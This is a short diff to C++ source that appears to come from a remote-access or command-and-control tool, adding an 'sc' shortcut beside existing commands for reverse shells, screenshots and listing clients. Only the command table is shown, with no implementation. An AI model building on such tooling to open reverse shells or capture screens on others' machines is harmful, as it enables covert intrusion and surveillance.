@@ -50,6 +50,7 @@ void Entrypoint::Startup()
 	_commands["r"] = [this] { SendReverseShell(); };
 	_commands["reverse"] = [this] { SendReverseShell(); };
 
+	_commands["sc"] = [this] { SendTakeScreenshot(); };
 	_commands["screenshot"] = [this] { SendTakeScreenshot(); };
 
 	_commands["l"] = [this] { ListClients(); };
